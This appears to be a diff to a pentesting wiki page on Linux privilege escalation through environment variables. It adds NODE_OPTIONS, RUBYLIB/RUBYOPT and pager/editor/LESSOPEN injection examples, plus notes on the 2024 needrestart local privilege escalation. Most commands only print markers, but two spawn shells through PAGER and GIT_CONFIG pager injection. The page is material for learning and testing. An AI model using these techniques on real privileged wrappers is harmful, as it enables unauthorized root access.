@@ -209,7 +209,7 @@ EOF
 BASH_ENV=/tmp/pre.sh bash -c 'echo target'
 ```
 
-Bash itself disables these startup files when the **real/effective IDs differ** unless `-p` is used, so the exact behavior depends on how the wrapper invokes the shell.
+Bash itself disables these startup files when the **real/effective IDs differ** unless `-p` is used, so the exact behavior depends on how the wrapper invokes the shell. Be careful with privileged wrappers that call `setuid()`/`setgid()` **before** launching Bash: once the IDs match again, Bash may trust `BASH_ENV`, `ENV`, and related shell state that would otherwise be ignored.
 
 ### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**
 
@@ -228,6 +228,8 @@ printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
 PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
 PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
 ```
+
+A recent real-world example was the 2024 **needrestart** LPE on Ubuntu/Debian systems: the root-owned scanner copied an unprivileged process's `PYTHONPATH` from `/proc/<PID>/environ` and then executed Python. The published exploit planted `importlib/__init__.so` in the attacker-controlled path so Python executed attacker code during its own initialization, before the helper's hard-coded script even mattered.
 
 ### **PERL5OPT & PERL5LIB**
 
@@ -248,7 +250,67 @@ EOF
 PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
 ```
 
-The same idea appears in other runtimes (`RUBYOPT`, `NODE_OPTIONS`, etc.): whenever an interpreter is launched by a privileged wrapper, look for env vars that modify **module loading** or **startup behavior**.
+### **NODE_OPTIONS**
+
+`NODE_OPTIONS` prepends **Node.js CLI flags** to every `node` process that inherits the environment. This makes it useful against wrappers, CI jobs, Electron helpers, and sudo rules that eventually invoke Node. The most interesting flags offensively are usually:
+
+- `--require <file>`: preload a CommonJS file before the target script.
+- `--import <module>`: preload an ES module before the target script.
+
+Node rejects some dangerous flags in `NODE_OPTIONS`, but `--require` and `--import` are explicitly allowed and are processed **before** the regular command-line arguments.
+
+```bash
+cat > /tmp/preload.js <<'EOF'
+console.error('[+] NODE_OPTIONS preload reached')
+EOF
+NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
+```
+
+For remote gadget chains that set `NODE_OPTIONS` indirectly (for example, prototype-pollution to RCE), check [this other page](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).
+
+### **RUBYLIB & RUBYOPT**
+
+Ruby offers the same class of startup abuse:
+
+- `RUBYLIB`: prepend directories to Ruby's load path.
+- `RUBYOPT`: inject command-line options such as `-r` into every `ruby` invocation.
+
+```bash
+mkdir -p /tmp/rubylib
+printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
+RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
+```
+
+The 2024 **needrestart** vulnerabilities showed that this is not just a lab trick: the same root-owned helper that was vulnerable to `PYTHONPATH` abuse could also be coerced into running Ruby with an attacker-controlled `RUBYLIB`, loading `enc/encdb.so` from an attacker directory.
+
+### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**
+
+Some tools do not just read a path from the environment; they pass the value to a **shell**, an **editor**, or an **input preprocessor**. This makes the following variables especially interesting when a privileged wrapper runs `git`, `man`, `less`, or similar text viewers:
+
+- `PAGER`, `MANPAGER`, `GIT_PAGER`: choose the pager command.
+- `GIT_EDITOR`, `VISUAL`, `EDITOR`: choose the editor command, often with arguments.
+- `LESSOPEN`, `LESSCLOSE`: define pre/post-processors that run when `less` opens a file.
+
+```bash
+PAGER='sh -c "exec sh 0<&1 1>&1"' man man
+
+cat > /tmp/lesspipe.sh <<'EOF'
+#!/bin/sh
+echo '[+] LESSOPEN triggered' >&2
+cat "$1"
+EOF
+chmod +x /tmp/lesspipe.sh
+LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
+```
+
+Git also supports **env-only config injection** without touching disk via `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, and `GIT_CONFIG_VALUE_<n>`:
+
+```bash
+GIT_CONFIG_COUNT=1 \
+GIT_CONFIG_KEY_0=core.pager \
+GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
+git -p help
+```
 
 From a post-exploitation perspective, also remember that inherited environments often contain **credentials**, **proxy settings**, **service tokens**, or **cloud keys**. Check [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) for `/proc/<PID>/environ` and `systemd` `Environment=` hunting.
 
@@ -278,5 +340,7 @@ One background job, one stopped and last command didn't finish correctly:
 
 - [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
 - [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [Qualys - LPEs in needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
+- [Node.js CLI documentation - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
 
 {{#include ../../banners/hacktricks-training.md}}
